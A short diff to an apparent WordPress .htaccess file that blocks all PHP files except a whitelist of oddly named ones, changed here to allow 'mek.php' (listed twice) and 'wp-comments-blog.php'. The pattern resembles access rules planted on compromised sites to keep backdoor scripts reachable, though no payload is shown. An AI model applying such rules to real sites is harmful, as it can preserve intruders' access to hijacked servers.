@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|wp-links-trackback.php|404.php|visual.php|class-walker.php|banner-project-description.php)$">
+<FilesMatch "^(index.php|wp-comments-blog.php|class-walker.php|mek.php|mek.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
